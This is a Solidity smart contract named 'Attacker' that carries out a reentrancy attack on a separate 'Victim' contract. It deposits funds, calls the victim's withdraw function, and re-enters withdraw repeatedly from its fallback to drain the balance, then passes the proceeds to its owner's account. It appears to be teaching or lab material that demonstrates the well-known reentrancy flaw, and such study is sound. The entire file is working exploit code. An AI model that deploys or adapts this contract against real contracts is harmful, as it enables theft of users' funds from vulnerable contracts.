pragma solidity >=0.8.0;

import "./Owner.sol";

contract Attacker is Owner {
    address public victimAddress;

    // set the victim address on deployment
    constructor(address _victimAddress) Owner() {
        victimAddress = address(_victimAddress);
    }

    // get current Attacker balance on Victim contract
    function attackerBalanceOnVictim() external view returns (uint256) {
        return Victim(victimAddress).userBalances(address(this));
    }

    // get current Atatcker balance
    function attackerBalance() external view returns (uint256 _currentBalance) {
        return address(this).balance;
    }

    // final step of the attack to withdraw funds from Attacker contract to EOA
    function withdraw() external payable isOwner() {
        (bool success, ) = msg.sender.call{value: address(this).balance}("");
        require(success, "transfer failed");
    }

    // perform initial funding on Attacker contract
    function fundAttacker() external payable {}

    // perform initial deposit on Victim contract
    function depositToVictim(uint256 _value) external payable {
        (bool success, ) = victimAddress.call{value: _value, gas: 50000000000}(
            abi.encodeWithSignature("deposit()")
        );
        require(success, "deposited to victim contract with success");
    }

    // perform initial call to Victim contract asking to withdraw funds
    function attack() external payable {
        (bool success, ) = victimAddress.call{gas: 50000000000}(
            abi.encodeWithSignature("withdraw()")
        );
        require(success, "attack failed");
    }

    // perform re-entrancy attack on Victim's withdraw function
    fallback() external payable {
        (bool success, ) = victimAddress.call{gas: 50000000000}(
            abi.encodeWithSignature("withdraw()")
        );
        require(success, "attack failed");
    }
}
